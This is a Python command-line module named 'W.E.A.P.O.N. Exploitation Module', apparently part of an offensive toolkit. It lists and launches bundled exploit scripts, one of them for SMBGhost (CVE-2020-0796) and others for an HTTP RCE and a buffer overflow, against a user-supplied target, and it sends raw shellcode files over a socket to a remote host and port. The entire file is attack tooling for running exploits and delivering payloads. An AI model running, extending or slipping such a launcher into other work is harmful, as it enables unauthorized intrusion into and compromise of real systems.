import argparse
import subprocess
import os
import sys
import socket

EXPLOIT_PATH = "./modules/exploitation/exploits"

BUILT_IN_EXPLOITS = {
    "smbghost": f"{EXPLOIT_PATH}/cve-2020-0796.py",
    "buffer-overflow": f"{EXPLOIT_PATH}/buffer_overflow_poc.py",
    "http-rce": f"{EXPLOIT_PATH}/http_rce_exploit.py"
}

def list_exploits():
    exploits = []
    for name, path in BUILT_IN_EXPLOITS.items():
        status = "[✓]" if os.path.exists(path) else "[✗ Missing]"
        exploits.append(f" - {name:15} {status} {path}")
    return "\n".join(["[*] Available built-in exploits:\n"] + exploits)

def run_exploit(name, target, args, log_callback=None):
    if name not in BUILT_IN_EXPLOITS:
        msg = f"[!] Exploit '{name}' not found."
        if log_callback:
            log_callback(msg)
        else:
            print(msg)
        return

    exploit_path = BUILT_IN_EXPLOITS[name]
    if not os.path.exists(exploit_path):
        msg = f"[!] Exploit script not found: {exploit_path}"
        if log_callback:
            log_callback(msg)
        else:
            print(msg)
        return

    cmd = ["python3", exploit_path, target] + args
    log_line = f"[*] Running exploit:\n    {' '.join(cmd)}\n"
    if log_callback:
        log_callback(log_line)
    else:
        print(log_line)

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = proc.communicate()

        if log_callback:
            log_callback(stdout)
            if stderr:
                log_callback("\n[!] STDERR:\n" + stderr)
        else:
            print(stdout)
            if stderr:
                print(stderr)

    except Exception as e:
        err = f"[!] Exploit execution failed: {e}"
        if log_callback:
            log_callback(err)
        else:
            print(err)

def run_shellcode(host, port, shellcode_file, log_callback=None):
    if not os.path.exists(shellcode_file):
        msg = f"[!] Shellcode file not found: {shellcode_file}"
        if log_callback:
            log_callback(msg)
        else:
            print(msg)
        return

    try:
        with open(shellcode_file, "rb") as f:
            shellcode = f.read()

        with socket.create_connection((host, int(port))) as s:
            s.sendall(shellcode)

        msg = f"[+] Shellcode sent successfully to {host}:{port}"
        if log_callback:
            log_callback(msg)
        else:
            print(msg)

    except Exception as e:
        err = f"[!] Failed to send shellcode: {e}"
        if log_callback:
            log_callback(err)
        else:
            print(err)

def main():
    parser = argparse.ArgumentParser(description="W.E.A.P.O.N. Exploitation Module")
    sub = parser.add_subparsers(dest="command", required=True)

    sub.add_parser("list", help="List available exploits")

    run_exp = sub.add_parser("run", help="Run a built-in exploit")
    run_exp.add_argument("exploit", help="Exploit name (e.g. http-rce)")
    run_exp.add_argument("target", help="Target IP or hostname")
    run_exp.add_argument("args", nargs=argparse.REMAINDER, help="Additional args to exploit")

    shell = sub.add_parser("shellcode", help="Send raw shellcode to remote listener")
    shell.add_argument("host", help="Target IP")
    shell.add_argument("port", help="Target port")
    shell.add_argument("file", help="Shellcode binary file")

    args = parser.parse_args()

    if args.command == "list":
        print(list_exploits())
    elif args.command == "run":
        run_exploit(args.exploit, args.target, args.args)
    elif args.command == "shellcode":
        run_shellcode(args.host, args.port, args.file)

if __name__ == "__main__":
    main()

